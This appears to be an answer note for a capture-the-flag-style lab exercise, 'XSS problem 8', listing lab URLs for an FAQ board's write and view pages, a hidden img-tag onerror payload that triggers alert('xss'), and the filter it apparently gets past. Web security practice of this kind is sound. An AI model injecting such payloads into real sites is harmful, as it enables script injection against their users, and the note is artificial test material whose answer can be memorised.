@@ -1,0 +1,17 @@
+============================
+
+* XSS 문제 8번 
+
+============================
+
+1. https://lab.eqst.co.kr:8083/exam22/faqwrite.php?contTextarea=
+
+2. https://lab.eqst.co.kr:8083/exam22/faqview.php?board_id=35721
+
+3. <img src="laidsjflkajdfklsadfjkl" onerror="var a = 1; var b = 2; c=a+b;alert('xss');" style="display:none;">
+ 
+
+4. xss_filter
+
+============================
+
